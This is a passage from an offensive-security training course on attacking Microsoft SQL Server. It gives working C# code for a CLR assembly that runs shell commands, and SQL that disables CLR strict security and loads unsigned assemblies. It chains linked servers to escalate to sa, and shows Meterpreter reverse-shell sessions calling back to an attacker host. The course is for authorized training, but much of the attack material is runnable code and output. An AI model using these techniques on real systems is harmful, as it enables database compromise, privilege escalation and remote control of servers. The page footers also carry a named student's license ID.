Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
595 
using System.Diagnostics; 
 
public class StoredProcedures 
{ 
    [Microsoft.SqlServer.Server.SqlProcedure] 
    public static void cmdExec (SqlString execCommand) 
    { 
      // TODO 
    } 
}; 
Listing 760 - Initial proof of concept 
We can implement any method we want inside the class. In this example, we are going to write 
code that starts a command prompt and executes the command given inside the execCommand 
argument. We are also going to return the result so our C# console application can print it. 
The Process class923 is used to start a process while allowing us to supply arguments through the 
StartInfo property.924 We use the FileName925 and Arguments926 properties of StartInfo to specify 
“cmd.exe” and the command to execute respectively. 
Additionally, we set UseShellExecute927 to “false” to ensure that the command prompt is created 
directly from cmd.exe. We also set RedirectStandardOutput928 to “true” so the output from the 
command prompt does not get printed to the console, but stored in a pipe instead. 
The required code for this is shown in Listing 761. 
... 
    [Microsoft.SqlServer.Server.SqlProcedure] 
    public static void cmdExec (SqlString execCommand) 
    { 
        Process proc = new Process(); 
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe"; 
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand); 
        proc.StartInfo.UseShellExecute = false; 
        proc.StartInfo.RedirectStandardOutput = true; 
        proc.Start(); 
... 
Listing 761 - Creating the cmd.exe process 
 
923 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process?view=netframework-4.8 
924 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.startinfo?view=netframework-4.8 
925 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.diagnostics.processstartinfo.filename?view=netframework-
4.8#System_Diagnostics_ProcessStartInfo_FileName 
926 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.diagnostics.processstartinfo.arguments?view=netframework-
4.8#System_Diagnostics_ProcessStartInfo_Arguments 
927 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute?view=netframework-
4.8#System_Diagnostics_ProcessStartInfo_UseShellExecute 
928 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.diagnostics.processstartinfo.redirectstandardoutput?view=netframework-
4.8#System_Diagnostics_ProcessStartInfo_RedirectStandardOutput 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
596 
Calling the Start929 method creates the process and executes the command supplied in the 
execCommand argument. 
Any output generated as a result of the command line input is not sent to the console, but we can 
retrieve it using the Pipe930 property of the SqlContext class.931 
The Pipe property is actually an embedded object instantiated from the SqlPipe class,932 which 
allows us to record SQL data and return it to the caller. We will use a combination of 
SendResultsStart,933 SendResultsRow,934 and SendResultsEnd935 to start recording, record data, 
and stop recording respectively. 
The object used by these APIs to record data into is of type SqlDataRecord.936 The code for this is 
in Listing 762. 
... 
proc.Start(); 
 
SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", 
System.Data.SqlDbType.NVarChar, 4000)); 
SqlContext.Pipe.SendResultsStart(record); 
record.SetString(0, proc.StandardOutput.ReadToEnd().ToString()); 
SqlContext.Pipe.SendResultsRow(record); 
SqlContext.Pipe.SendResultsEnd(); 
... 
Listing 762 - Returning output to the caller 
To send the output from the command prompt to the SQL record, we copy the contents of the 
Process object StandardOutput937 property into the record. 
This is then returned as part of the result set from the SQL query. Finally, we force the cmd.exe 
process to wait until all actions are completed and subsequently close it. The complete code is 
given in Listing 763. 
using System; 
using Microsoft.SqlServer.Server; 
using System.Data.SqlTypes; 
using System.Diagnostics; 
 
 
929 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start?view=netframework-4.8 
930 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/microsoft.sqlserver.server.sqlcontext.pipe?view=netframework-4.8 
931 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/microsoft.sqlserver.server.sqlcontext?view=netframework-4.8 
932 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/microsoft.sqlserver.server.sqlpipe.sendresultsstart?view=netframework-4.8 
933 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/microsoft.sqlserver.server.sqlpipe.sendresultsstart?view=netframework-4.8 
934 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/microsoft.sqlserver.server.sqlpipe.sendresultsrow?view=netframework-4.8 
935 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/microsoft.sqlserver.server.sqlpipe.sendresultsend?view=netframework-4.8 
936 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/microsoft.sqlserver.server.sqldatarecord?view=netframework-4.8 
937 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.standardoutput?view=netframework-
4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
597 
public class StoredProcedures 
{ 
    [Microsoft.SqlServer.Server.SqlProcedure] 
    public static void cmdExec (SqlString execCommand) 
    { 
        Process proc = new Process(); 
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe"; 
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand); 
        proc.StartInfo.UseShellExecute = false; 
        proc.StartInfo.RedirectStandardOutput = true; 
        proc.Start(); 
 
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", 
System.Data.SqlDbType.NVarChar, 4000)); 
        SqlContext.Pipe.SendResultsStart(record); 
        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString()); 
        SqlContext.Pipe.SendResultsRow(record); 
        SqlContext.Pipe.SendResultsEnd(); 
 
        proc.WaitForExit(); 
        proc.Close(); 
    } 
}; 
Listing 763 - Complete code for assembly 
Once we have compiled the code into a DLL, we have the assembly that we are going to load into 
the SQL server and execute. The next step is to find a suitable target database inside the SQL 
server, since we can only create a procedure from an assembly if the TRUSTWORTHY property is 
set. 
Recall that by default, only the msdb database has this property enabled, but custom databases 
may use it as well. With this in mind, we are going to target msdb. 
Creating a stored procedure from an assembly is not allowed by default. This is controlled 
through the CLR Integration938 setting, which is disabled by default. Luckily, we can enable it with 
sp_configure and the clr enabled option. 
Beginning with Microsoft SQL server 2017, there is an additional security mitigation called CLR 
strict security.939 This mitigation only allows signed assemblies by default. CLR strict security can 
be disabled through sp_configure with the clr strict security option. 
In summary, we must execute the SQL statements shown in Listing 764 before we start creating 
the stored procedure from an assembly. 
use msdb 
 
EXEC sp_configure 'show advanced options',1 
RECONFIGURE 
 
 
938 (Microsoft, 2019), https://docs.microsoft.com/en-us/sql/relational-databases/clr-integration/clr-integration-enabling?view=sql-
server-ver15 
939 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/clr-strict-security?view=sql-server-
ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
598 
EXEC sp_configure 'clr enabled',1 
RECONFIGURE 
 
EXEC sp_configure 'clr strict security', 0 
RECONFIGURE 
Listing 764 - Enable CLR and disable strict security 
With all the security considerations taken care of, we can import the assembly with the CREATE 
ASSEMBLY statement. Its prototype is in Listing 765. 
CREATE ASSEMBLY assembly_name   
[ AUTHORIZATION owner_name ]   
FROM { <client_assembly_specifier> | <assembly_bits> [ ,...n ] }   
[ WITH PERMISSION_SET = { SAFE | EXTERNAL_ACCESS | UNSAFE } ] 
Listing 765 - CREATE ASSEMBLY prototype 
We must supply a custom assembly name, a file location, and specify the PERMISSION_SET to be 
UNSAFE to allow execution of unsigned .NET code. 
As the first step, we are going to copy the compiled assembly (cmdExec.dll) onto dc01 in the 
C:\Tools folder. 
On Windows server 2016 and earlier, this technique would also work through a 
UNC path, but Windows server 2019 does not allow access to SMB shares 
without authentication. 
While this is not something we’d use in a real-world scenario, it will help us understand the 
technique. Later in the section, we will improve our technique and learn how to avoid this step. 
Next, we can craft the CREATE ASSEMBLY command and import the DLL. 
CREATE ASSEMBLY myAssembly FROM 'c:\tools\cmdExec.dll' WITH PERMISSION_SET = UNSAFE; 
Listing 766 - Import assembly with CREATE ASSEMBLY 
Once the DLL has been imported, we need to create a procedure based on the cmdExe method 
with the CREATE PROCEDURE statement.940 
CREATE [ OR ALTER ] { PROC | PROCEDURE }  
    [schema_name.] procedure_name [ ; number ]    
    [ { @parameter [ type_schema_name. ] data_type }   
        [ VARYING ] [ = default ] [ OUT | OUTPUT | [READONLY]   
    ] [ ,...n ]    
[ WITH <procedure_option> [ ,...n ] ]   
[ FOR REPLICATION ]    
AS { [ BEGIN ] sql_statement [;] [ ...n ] [ END ] }   
[;]   
Listing 767 - CREATE PROCEDURE prototype 
 
940 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/t-sql/statements/create-procedure-transact-sql?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
599 
To do so, we first specify the “CREATE PROCEDURE” statement followed by the name we want to 
assign to our custom procedure ([dbo].[cmdExec]) and the argument(s) it accepts 
(@execCommand NVARCHAR (4000)). We then specify the function name in our newly imported 
assembly ([myAssembly].[StoredProcedures].[cmdExec]), which will be executed when our 
procedure is invoked. 
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME 
[myAssembly].[StoredProcedures].[cmdExec]; 
Listing 768 - Create procedure from assembly 
The last half of the SQL query starts with the AS keyword and then specifies the location of the C# 
method to create a procedure from ([myAssembly].[StoredProcedures].[cmdExec]). This is 
marked by the EXTERNAL NAME prefix since it is non-native. 
As the final step, we must invoke the newly-created procedure and supply an argument. 
EXEC cmdExec 'whoami' 
Listing 769 - Execute the new procedure 
Now that we have everything we need, we can combine it and implement it from our C# console 
application. The output from running it is shown in Listing 770. 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Result of command is: corp1\sqlsvc 
Listing 770 - Execution of the method from the assembly 
This proves that we obtained code execution through our custom assembly! 
It is not possible to call CREATE ASSEMBLY on the same assembly multiple 
times without removing the previous one. Instead, the DROP ASSEMBLY 
statement941 must be used to drop it. In addition, an assembly cannot be 
dropped if a procedure that requires it has been created. In that case, the DROP 
PROCEDURE statement942 must be used first. 
In our technique to get code execution from a custom assembly, we initially copied the compiled 
assembly to the hard drive of the SQL server, which is not realistic. Let’s explore a better 
alternative. 
It is possible to directly embed the assembly in the CREATE ASSEMBLY SQL query. This is done 
by directly putting a hexadecimal string containing the binary content of the assembly in the 
FROM clause instead of specifying the file path. 
To convert the assembly (cmdExec.dll) into a hexadecimal string, we use the small PowerShell 
script shown in Listing 771. 
 
941 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/t-sql/statements/drop-assembly-transact-sql?view=sql-server-ver15 
942 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/t-sql/statements/drop-procedure-transact-sql?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
600 
$assemblyFile = 
"\\192.168.119.120\visualstudio\Sql\cmdExec\bin\x64\Release\cmdExec.dll" 
$stringBuilder = New-Object -Type System.Text.StringBuilder  
 
$fileStream = [IO.File]::OpenRead($assemblyFile) 
while (($byte = $fileStream.ReadByte()) -gt -1) { 
    $stringBuilder.Append($byte.ToString("X2")) | Out-Null 
} 
$stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt 
Listing 771 - Converting DLL into hexidecimal string 
With the assembly converted to a hexadecimal string, we only have to update the CREATE 
ASSEMBLY statement as given in Listing 772.  
CREATE ASSEMBLY my_assembly FROM 0x4D5A900..... WITH PERMISSION_SET = UNSAFE; 
Listing 772 - CREATE ASSEMBLY statement with hexidecimal string 
Before executing the updated C# console application, we have to ensure that our previous work 
with CREATE ASSEMBLY and CREATE PROCEDURE has not left any procedures or assemblies on 
the SQL server. If this is the case, we must first remove them with DROP PROCEDURE and DROP 
ASSEMBLY. 
After that is done, we can execute the query with the embedded assembly and get code execution 
as shown in Listing 773. 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Result of command is: corp1\sqlsvc 
Listing 773 - Execution of the method from the assembly 
Once more, we have arbitrary code execution but this time without having to write an assembly to 
disk on the target! 
In this section, we covered how to gain code execution on the SQL server host operating system 
through a custom assembly, which allows us to reuse our previous C# code. 
15.2.3.1 Exercises 
1. 
Repeat the steps to obtain command execution through the custom assembly. 
2. 
Leverage the technique to obtain a reverse shell. 
15.3 Linked SQL Servers 
So far, we have exclusively dealt with the SQL server on dc01. As we discovered during 
enumeration, there is also a SQL server instance on appsrv01. It is possible to link multiple SQL 
servers943 together in such a way that a query executed on one SQL server fetches data or 
performs an action on a different SQL server. 
 
943 (Microsoft, 2019), https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-
engine?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
601 
In the next sections, we are going to dig into how this type of link can be leveraged to perform 
both privilege escalation and obtain code execution on additional SQL servers. 
15.3.1 
Follow the Link 
When a link from one SQL server to another is created, the administrator must specify the 
execution context that will be used during the connection. While it is possible to have the context 
be dynamic based on the security context944 of the current login, some administrators opt to 
choose a specific SQL login instead. 
If the administrator chooses a specific SQL login and that login has sysadmin role membership, 
we would obtain sysadmin privileges on the linked SQL server. This will be the case even if we 
only have low privileged access on the original SQL server. 
The first step for this kind of attack is to enumerate servers linked to the current SQL server. The 
sp_linkedservesr945 stored procedure returns a list of linked servers for us. It does not require any 
arguments, but it may return multiple results that we must print to the console. 
In this example, we are going to connect to appsrv01 instead of dc01 and not perform any 
impersonation, since sp_linkedserver does not require any privileges to execute. An excerpt of the 
required code is shown in Listing 774. 
... 
            Environment.Exit(0); 
        } 
 
        String execCmd = "EXEC sp_linkedservers;"; 
 
        SqlCommand command = new SqlCommand(execCmd, con); 
        SqlDataReader reader = command.ExecuteReader(); 
 
        while (reader.Read()) 
        { 
            Console.WriteLine("Linked SQL server: " + reader[0]); 
        } 
        reader.Close(); 
 
        con.Close(); 
    } 
} 
... 
Listing 774 - Code to enumerate linked server 
Once the C# console application has been compiled, we can enumerate all linked servers from 
appsrv01 and obtain the results displayed in Listing 775. 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
 
944 (Microsoft, 2020), https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-
database-engine?view=sql-server-ver15 
945 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-linkedservers-
transact-sql?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
602 
Linked SQL server: APPSRV01\SQLEXPRESS 
Linked SQL server: DC01 
Listing 775 - Linked servers from appsrv01 
As noted from the highlighted output, there is a linked SQL server called “DC01”. 
The next step is to perform a SQL query on a linked server. First, we are going to simply find the 
version of the SQL server instance on dc01. This can be done using the OPENQUERY946 keyword 
as part of the FROM clause. An example is given in Listing 776. 
select version from openquery("dc01", 'select @@version as version') 
Listing 776 - Use OPENQUERY to enumeration SQL version 
When implementing this in our C# console application, we need to be careful to escape double 
quotes (") correctly. 
With the project compiled, we execute it and obtain the version from the linked SQL server. 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Linked SQL server version: Microsoft SQL Server 2019 (RTM) - 15.0.32.50 (X64) 
        Aug 22 2019 17:04:49 
        Copyright (C) 2019 Microsoft Corporation 
        Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 
17763: ) (Hypervisor) 
Listing 777 - Locating SQL server version on DC01 
This example proves that it’s possible to perform SQL queries across linked servers. Let’s see 
which security context we are executing in. 
In order to do that, we replace the query for the SQL version to the SQL login with SYSTEM_USER 
and obtain the results given in Listing 778. 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Executing as the login corp1\offsec on APPSRV01 
Executing as the login sa on DC01 
Listing 778 - Enumerating the security context on linked server DC01 
As noted from Listing 778, our local login is our domain user, while the linked security context is 
sa. Excellent! 
We already learned that sa access allows us to gain code execution. To do this again, we will 
execute our PowerShell shellcode runner through a download cradle with the xp_cmdshell stored 
procedure. 
Since xp_cmdshell (and other code execution techniques) require advanced options to be 
changed, we must update the running configuration using the RECONFIGURE statement. When 
this statement is executed against a remote server, Microsoft SQL uses Remote Procedure Call 
 
946 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/t-sql/functions/openquery-transact-sql?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
603 
(RPC) to do so. For this to work, the created link must be configured with outbound RPC through 
the RPC Out947 setting. 
RPC Out is not a setting that is turned on by default, but is commonly set by system 
administrators. If RPC Out is not allowed, it can be enabled with the sp_serveroption stored 
procedure948 if our current user has sysadmin role membership. 
Microsoft documentation for OPENQUERY949 specifically states that executing stored procedures 
is not supported on linked SQL servers. Instead, we are going to use the AT keyword to specify 
which linked SQL server a query should be executed on. 
Listing 779 shows the query needed to enable advanced options. 
EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT DC01 
Listing 779 - Executing sp_configre on linked server 
Notice the use of single quotes; the SQL escape character for a single quote is a single quote, 
which means that we must double them on the inner strings. 
Similarly, we can enable xp_cmdshell and invoke it on dc01. When using the PowerShell download 
cradle, we must keep an eye out for string quote issues. The simplest way to solve this is by 
Base64 encoding the download cradle and invoking it with the EncodedCommand parameter. In 
this manner, all string quotes are avoided. 
After updating the C# console application, setting up a Meterpreter listener, and ensuring that the 
PowerShell shellcode runner is present on our Apache web server, we can trigger the attack and 
obtain a reverse shell on the linked SQL server: 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.10; (UUID: q43npwu4) 
Staging x64 payload (202329 bytes) ... 
[*] Meterpreter session 1 opened (192.168.119.120:443 -> 192.168.120.10:51808) 
 
 
meterpreter > sysinfo 
Computer        : DC01 
OS              : Windows 2016+ (10.0 Build 17763). 
Architecture    : x64 
... 
Listing 780 - Getting a shell from the linked SQL server 
As noted from the output of the sysinfo command in Listing 780, our reverse shell does indeed 
come from dc01. 
Note that the SQL server process is terminated when the shell exits unless EXITFUNC is set to 
thread. 
 
947 (Microsoft, 2012), https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-
r2/ms186839(v=sql.105)?redirectedfrom=MSDN 
948 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-serveroption-transact-
sql?view=sql-server-ver15 
949 (Microsoft, 2017), https://docs.microsoft.com/en-us/sql/t-sql/functions/openquery-transact-sql?view=sql-server-ver15 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
604 
In this section, we have learned how linked SQL servers can be abused to execute SQL queries on 
other SQL servers and even obtain code execution on them. In the next section, we are going to 
abuse this even further to perform privilege escalation. 
15.3.1.1 Exercises 
1. 
Enumerate linked SQL servers from appsrv01. 
2. 
Implement the code required to enable and execute xp_cmdshell on dc01 and obtain a 
reverse shell. 
15.3.1.2 Extra Mile 
While Microsoft documentation specifies that execution of stored procedures is not supported on 
linked SQL servers with the OPENQUERY keyword, it is actually possible. 
Modify the SQL queries to obtain code execution on dc01 using OPENQUERY instead of AT. 
15.3.2 
Come Home To Me 
In the previous section, we discovered that if linked SQL servers exist, it may be possible to exploit 
them depending on the security context of the link. In this section, we are going to learn how this 
could also be used for privilege escalation on the local SQL server. 
As we learned previously, the SQL server at appsrv01 has a link to the one at dc01. We can also 
execute the sp_linkedservers procedure on dc01 to locate any additional links from dc01. One 
important fact to keep in mind is that SQL server links are not bidirectional by default. 
The easiest way to do this is with the AT syntax as shown in Listing 781. 
EXEC ('sp_linkedservers') AT DC01 
Listing 781 - Find linked servers on DC01 
We can update our original link enumeration C# code to find the linked servers on dc01, which 
yields the results given in Listing 782. 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Linked SQL server: APPSRV01 
Linked SQL server: DC01\SQLEXPRESS 
Listing 782 - DC01 has a link to APPSRV01 
The SQL server on dc01 has a link to the SQL server on appsrv01. This means that we could 
follow the link to dc01 to obtain the SA login security context, and then return back over the link to 
appsrv01. 
To investigate what privileges that gives us on appsrv01, we can use the OPENQUERY keyword 
twice. First, we’ll use it to execute a query on dc01 and inside that, we’ll use it again to execute a 
query on appsrv01. 
select mylogin from openquery("dc01", 'select mylogin from openquery("appsrv01", 
''select SYSTEM_USER as mylogin'')') 
Listing 783 - Finding the login on APPSRV01 after following the links 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
605 
Once we implement this in our C# console application (while remembering to escape the double 
quotes), we find that our privileges on appsrv01 have been elevated. 
PS C:\Tools> \\192.168.119.120\visualstudio\Sql\Sql\bin\Release\Sql.exe 
Auth success! 
Executing as login: sa 
Listing 784 - We are in security context of SA after following links 
We started with the corp1\offsec login but after following the link to dc01 and then back to 
appsrv01, we have obtained execution as sa. Nice! 
Since we now have sysadmin role membership on appsrv01, we can get code execution through 
the same technique as in the previous section. 
Again, the most direct way is with the AT keyword, but we have to execute a query on the linked 
server dc01, which then executes a query on appsrv01. This means we need two instances of the 
AT keyword as shown in Listing 785. 
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT 
appsrv01') AT dc01 
Listing 785 - Enabling advanced options on appsrv01 
It is also important to notice the use of single quotes in the SQL query. We have to escape all 
embedded single quotes with single quotes, which means the inner string (show advanced 
options) needs four single quotes. 
Each time we follow a link, the number of single quotes doubles, so we need to 
be careful when crafting queries. 
We can modify the remaining SQL queries in the same manner to execute our PowerShell 
download cradle on appsrv01. Once the C# console application is updated and executed, we 
obtain our reverse Meterpreter shell as given in Listing 786. Nice! 
[*] Started HTTPS reverse handler on https://192.168.119.120:443 
[*] https://192.168.119.120:443 handling request from 192.168.120.6; (UUID: tqdniu2q) 
Staging x64 payload (202329 bytes) ... 
[*] Meterpreter session 2 opened (192.168.119.120:443 -> 192.168.120.6:50270) 
 
 
meterpreter > sysinfo 
Computer        : APPSRV01 
OS              : Windows 2016+ (10.0 Build 17763). 
Architecture    : x64 
... 
Listing 786 - Reverse shell from appsrv01 
If no other privilege escalation paths are possible, we may be able to use a bidirectional link to 
elevate privileges on the same SQL server. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
606 
In this section, we saw that it’s possible to enumerate nested linked SQL servers and even 
execute queries on them. In theory, this allows us to follow as many links as we want and 
possibly gain code execution from many SQL servers. 
15.3.2.1 Exercises 
1. 
Repeat the enumeration steps to find the login security context after following the link first to 
dc01 and then back to appsrv01. 
2. 
Obtain a reverse shell on appsrv01 by following the links. 
15.3.2.2 Extra Mile 
A PowerShell script called PowerUpSQL950 exists that can help automate all the enumerations and 
attacks we have performed in this module. 
A C# implementation of PowerUpSQL called Database Audit Framework & Toolkit (DAFT)951 also 
exists. 
Download and use either of them to access, elevate, and own the two SQL servers. 
Evil SQL Client (ESC)952 is yet another implementation of the same features 
written in C#. It has been prebuilt to work with MSBuild to avoid detection and 
bypass Application Whitelisting. 
15.4 Wrapping Up 
In this module, we presented multiple techniques to attack and compromise a Microsoft SQL 
server in a domain setting. 
Most of the techniques also apply to SQL injection vulnerabilities. As such, it may be possible to 
compromise multiple SQL servers deep in the internal network directly from a perimeter web 
server if insecure permissions and SQL server links exist. 
This module focused exclusively on Microsoft SQL due to its common authentication integration 
with Active Directory, but other database types such as Oracle and MySQL can have similar 
misconfigurations. It’s also possible to have SQL links between databases of different types. 
 
950 (NetSPI, 2020), https://github.com/NetSPI/PowerUpSQL 
951 (NetSPI, 2019), https://github.com/NetSPI/DAFT 
952 (NetSPI, 2020), https://github.com/NetSPI/ESC 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
607 
 
16 Active Directory Exploitation 
Designed specifically for large-scale deployment, Active Directory (AD) is a central component of 
most mid to large-size organizations, seamlessly handling multiple authentication types. The 
complexity of Active Directory object permissions, Kerberos delegation, and Active Directory trust 
in particular sets the stage for several interesting and often-neglected attack vectors that we will 
explore in this module. 
As we will discover, a weak or insecure AD configuration in any subsidiary or department of a 
large organization can lead to complete compromise of that organization, making this topic 
particularly relevant for penetration testers. 
16.1 AD Object Security Permissions 
In an Active Directory implementation, all elements such as users, computers, or groups are 
objects with an associated set of access permissions, not unlike permissions associated with 
files on a local file system. 
If AD permissions are set incorrectly, we may be able to exploit them to perform privilege 
escalation or lateral movement within the domain. In the following sections, we’ll discuss these 
securable object permissions and demonstrate how to enumerate and exploit them. 
16.1.1 
Object Permission Theory 
Let’s begin with a discussion of Active Directory securable object permissions. 
Within Active Directory, access to an object is controlled through a Discretionary Access Control 
List (DACL), which consists of a series of Access Control Entries (ACE).953 Each ACE defines 
whether access to the object is allowed or denied, which entity the ACE applies to, and the type of 
access. 
Note that when multiple ACE’s are present, their order is important. If a deny ACE comes before 
an allow ACE, the deny takes precedence, since the first match principle applies. 
The concept of DACL and ACE are relatively similar to Windows file access permissions, but the 
information stored for each ACE is a bit complex. An ACE is stored according to the Security 
Descriptor Definition Language (SDDL),954 which is a string delimited by semicolons. 
The SDDL prototype is shown in Listing 787.955 
ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid 
Listing 787 - ACE string prototype 
Each element of the ACE string consists of one or more concatenated values. The first element is 
the ace_type, which designates whether the ACE allows or denies permissions. Next, the ace_flags 
 
953 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces 
954 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language 
955 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
608 
set flags related to inheritance on child objects. The third element is the access rights956 applied 
by the ACE, while object_guid and inherit_object_guid allows the ACE to apply to only specific 
objects as provided by the GUID values. Finally, the account_sid is the SID of the object that the 
ACE applies to. 
As an example, imagine that the ACE on object A applies to object B. This grants or denies object 
B access to object A with the specified access rights. 
Since the ACE is detailed by the SDDL format, it can be difficult to read as illustrated by the 
example ACE string shown in Listing 788. 
(A;;RPWPCCDCLCSWRCWDWOGA;;;S-1-1-0) 
Listing 788 - ACE string example 
As highlighted above, only the ACE type, access rights, and SID are populated but are not easily 
readable. We can, however, use Microsoft documentation957,958 to translate the ACE string as 
follows: 
AceType:        
A = ACCESS_ALLOWED_ACE_TYPE 
 
Access rights: 
RP = ADS_RIGHT_DS_READ_PROP 
WP = ADS_RIGHT_DS_WRITE_PROP 
CC = ADS_RIGHT_DS_CREATE_CHILD 
DC = ADS_RIGHT_DS_DELETE_CHILD 
LC = ADS_RIGHT_ACTRL_DS_LIST 
SW = ADS_RIGHT_DS_SELF 
RC = READ_CONTROL 
WD = WRITE_DAC 
WO = WRITE_OWNER 
GA = GENERIC_ALL 
 
Ace Sid:  
S-1-1-0 
Listing 789 - ACE string translated 
The translated ACE string shown in Listing 789 reveals that if we control the object given by the 
ACE SID, we obtain the WRITE_DAC, WRITE_OWNER, and GENERIC_ALL access rights among 
others. 
From a penetration testing perspective, this means that improperly configured DACLs can lead to 
compromise of user accounts, domain groups, or even computers. 
We will discuss these and other compromise techniques in later sections, but we must first 
enumerate the DACLs. 
 
956 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks 
957 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/generic-access-rights 
958 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
609 
All authenticated domain users can read AD objects (such as users, computers, and groups) and 
their DACLs, meaning we can enumerate weak ACL configurations from a compromised low-
privilege domain user account. 
Unfortunately, there are rarely tools installed for this task but we can perform this lookup through 
LDAP959 with the Get-ObjectAcl960 PowerView961 method. 
To test this out, we’ll log in to the Windows 10 client as the Offsec domain user (prod\offsec) and 
open PowerShell with a bypass execution policy. PowerView is located in C:\Tools, and after 
